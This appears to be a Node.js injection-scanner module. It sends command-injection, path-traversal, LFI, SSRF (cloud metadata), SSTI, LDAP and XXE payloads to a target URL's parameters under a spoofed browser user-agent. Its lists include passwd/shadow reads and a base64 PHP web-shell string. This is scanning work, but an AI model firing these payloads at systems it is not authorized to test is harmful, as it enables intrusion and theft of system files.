const axios = require('axios');

// Additional injection tests beyond XSS and SQLi
const COMMAND_INJECTION_PAYLOADS = [
  { payload: '; ls', name: 'Semicolon ls', category: 'command' },
  { payload: '| whoami', name: 'Pipe whoami', category: 'command' },
  { payload: '$(whoami)', name: 'Command substitution', category: 'command' },
  { payload: '`whoami`', name: 'Backtick injection', category: 'command' },
  { payload: '; cat /etc/passwd', name: 'Cat passwd', category: 'command' },
  { payload: '| cat /etc/shadow', name: 'Cat shadow', category: 'command' },
  { payload: '& net user', name: 'Windows net user', category: 'command' },
  { payload: '| dir', name: 'Windows dir', category: 'command' },
  { payload: '; ping -c 1 127.0.0.1', name: 'Ping injection', category: 'command' },
  { payload: '|| sleep 5', name: 'Sleep injection', category: 'command' },
];

const PATH_TRAVERSAL_PAYLOADS = [
  { payload: '../../../etc/passwd', name: 'Unix passwd (3 levels)', category: 'path-traversal' },
  { payload: '../../../../etc/passwd', name: 'Unix passwd (4 levels)', category: 'path-traversal' },
  { payload: '../../../../../etc/passwd', name: 'Unix passwd (5 levels)', category: 'path-traversal' },
  { payload: '..\\..\\..\\windows\\system32\\config\\sam', name: 'Windows SAM', category: 'path-traversal' },
  { payload: '....//....//....//etc/passwd', name: 'Double dot bypass', category: 'path-traversal' },
  { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', name: 'URL encoded traversal', category: 'path-traversal' },
  { payload: '..%252f..%252f..%252fetc%252fpasswd', name: 'Double URL encoded', category: 'path-traversal' },
  { payload: '/etc/passwd%00.jpg', name: 'Null byte bypass', category: 'path-traversal' },
  { payload: '..%c0%af..%c0%af..%c0%afetc/passwd', name: 'UTF-8 overlong', category: 'path-traversal' },
  { payload: '..%255c..%255c..%255cwindows%255csystem32%255cconfig%255csam', name: 'IIS double encoding', category: 'path-traversal' },
];

const LFI_PAYLOADS = [
  { payload: '/etc/passwd', name: 'Direct LFI passwd', category: 'lfi' },
  { payload: '/proc/self/environ', name: 'LFI environ', category: 'lfi' },
  { payload: '/proc/self/cmdline', name: 'LFI cmdline', category: 'lfi' },
  { payload: '/var/log/apache2/access.log', name: 'Apache access log', category: 'lfi' },
  { payload: '/var/log/nginx/access.log', name: 'Nginx access log', category: 'lfi' },
  { payload: 'php://filter/convert.base64-encode/resource=index.php', name: 'PHP filter wrapper', category: 'lfi' },
  { payload: 'php://input', name: 'PHP input wrapper', category: 'lfi' },
  { payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', name: 'PHP data wrapper', category: 'lfi' },
  { payload: 'expect://whoami', name: 'PHP expect wrapper', category: 'lfi' },
  { payload: 'file:///etc/passwd', name: 'File protocol', category: 'lfi' },
];

const SSRF_PAYLOADS = [
  { payload: 'http://127.0.0.1', name: 'Localhost', category: 'ssrf' },
  { payload: 'http://127.0.0.1:80', name: 'Localhost port 80', category: 'ssrf' },
  { payload: 'http://127.0.0.1:443', name: 'Localhost port 443', category: 'ssrf' },
  { payload: 'http://127.0.0.1:22', name: 'Localhost SSH', category: 'ssrf' },
  { payload: 'http://127.0.0.1:3306', name: 'Localhost MySQL', category: 'ssrf' },
  { payload: 'http://0.0.0.0', name: 'All interfaces', category: 'ssrf' },
  { payload: 'http://[::1]', name: 'IPv6 localhost', category: 'ssrf' },
  { payload: 'http://169.254.169.254', name: 'AWS metadata', category: 'ssrf' },
  { payload: 'http://169.254.169.254/latest/meta-data/', name: 'AWS instance metadata', category: 'ssrf' },
  { payload: 'http://metadata.google.internal/', name: 'GCP metadata', category: 'ssrf' },
  { payload: 'http://100.100.100.200/latest/meta-data/', name: 'Alibaba metadata', category: 'ssrf' },
  { payload: 'http://169.254.169.254/metadata/v1/', name: 'DigitalOcean metadata', category: 'ssrf' },
  { payload: 'http://192.168.1.1', name: 'Internal network', category: 'ssrf' },
  { payload: 'http://10.0.0.1', name: 'Private network', category: 'ssrf' },
  { payload: 'file:///etc/passwd', name: 'File protocol SSRF', category: 'ssrf' },
];

const SSTI_PAYLOADS = [
  { payload: '{{7*7}}', name: 'Jinja2 SSTI', expected: '49', category: 'ssti' },
  { payload: '${7*7}', name: 'Freemarker SSTI', expected: '49', category: 'ssti' },
  { payload: '#{7*7}', name: 'Thymeleaf SSTI', expected: '49', category: 'ssti' },
  { payload: '<%= 7*7 %>', name: 'ERB SSTI', expected: '49', category: 'ssti' },
  { payload: '{{constructor.constructor("return 7*7")()}}', name: 'Angular SSTI', expected: '49', category: 'ssti' },
  { payload: '*{7*7}', name: 'Velocity SSTI', expected: '49', category: 'ssti' },
  { payload: '#set($x=7*7)$x', name: 'Velocity vars', expected: '49', category: 'ssti' },
  { payload: '${T(java.lang.Runtime).getRuntime()}', name: 'Spring EL injection', expected: '', category: 'ssti' },
  { payload: '{{config}}', name: 'Flask config leak', expected: '', category: 'ssti' },
  { payload: '{{self}}', name: 'Jinja2 self', expected: '', category: 'ssti' },
];

const LDAP_PAYLOADS = [
  { payload: '*', name: 'LDAP wildcard', category: 'ldap' },
  { payload: '*)(&', name: 'LDAP filter break', category: 'ldap' },
  { payload: '*)(uid=*))(|(uid=*', name: 'LDAP injection', category: 'ldap' },
  { payload: '\\28', name: 'LDAP encoded paren', category: 'ldap' },
  { payload: 'admin)(&)', name: 'LDAP filter bypass', category: 'ldap' },
];

const XML_PAYLOADS = [
  { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', name: 'XXE file read', category: 'xxe' },
  { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>', name: 'XXE SSRF', category: 'xxe' },
  { payload: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><foo>&lol2;</foo>', name: 'XML Bomb (Billion Laughs)', category: 'xxe' },
];

const ERROR_INDICATORS = [
  /root:.*:0:0/i, /daemon:.*:1:1/i,  // passwd file
  /\buid=\d+/i, /\bgid=\d+/i,  // whoami output
  /directory listing/i, /index of/i,  // directory listing
  /syntax error/i, /parse error/i,
  /stack trace/i, /exception/i, /traceback/i,
  /warn.*php/i, /fatal.*error/i,
  /internal server error/i, /500 error/i,
  /application error/i, /runtime error/i,
  /undefined.*variable/i, /undefined.*method/i,
  /null.*pointer/i, /null.*reference/i,
  /command not found/i, /permission denied/i,
  /access.*denied/i, /unauthorized/i,
];

async function scan(targetUrl) {
  const results = { findings: [], tests: [] };
  try {
    const testParams = ['url', 'file', 'path', 'page', 'doc', 'document', 'folder', 'root', 'dir', 'cmd', 'exec', 'command', 'ping', 'query', 'host', 'ip', 'domain', 'includelanguage', 'template', 'render'];

    const allPayloads = [
      ...COMMAND_INJECTION_PAYLOADS,
      ...PATH_TRAVERSAL_PAYLOADS,
      ...LFI_PAYLOADS,
      ...SSRF_PAYLOADS,
      ...SSTI_PAYLOADS,
      ...LDAP_PAYLOADS,
    ];

    // Active testing on key params — only log results for tests actually performed
    for (const param of testParams.slice(0, 8)) {
      for (const injection of allPayloads.slice(0, 25)) {
        try {
          const testUrl = new URL(targetUrl);
          testUrl.searchParams.set(param, injection.payload);
          const response = await axios.get(testUrl.toString(), {
            timeout: 5000, maxRedirects: 3, validateStatus: () => true,
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
          });
          const body = typeof response.data === 'string' ? response.data : '';

          // Check for success indicators
          let vulnerable = false;
          for (const pattern of ERROR_INDICATORS) {
            if (pattern.test(body)) {
              vulnerable = true;
              results.findings.push({ param, payload: injection.name, category: injection.category, severity: 'critical', indicator: pattern.toString() });
              results.tests.push({ id: `inj-${param}-${injection.name.replace(/\s/g,'-')}`, name: `${injection.category.toUpperCase()}: ${param} (${injection.name})`, status: 'fail', severity: 'critical' });
              break;
            }
          }

          // SSTI check
          if (injection.expected && body.includes(injection.expected)) {
            results.findings.push({ param, payload: injection.name, category: 'ssti', severity: 'critical' });
            results.tests.push({ id: `inj-ssti-${param}`, name: `SSTI: ${param} (${injection.name})`, status: 'fail', severity: 'critical' });
            vulnerable = true;
          }

          if (!vulnerable) {
            results.tests.push({ id: `inj-safe-${param}-${injection.name.replace(/\s/g,'-')}`, name: `${injection.category.toUpperCase()} safe: ${param}`, status: 'pass', severity: 'info' });
          }
        } catch { /* request failed — not counted */ }
      }
    }

  } catch (err) {
    results.error = `Injection scan failed: ${err.message}`;
  }
  return { scanner: 'Advanced Injections', icon: '🔓', results, testCount: results.tests.length };
}

module.exports = { scan };
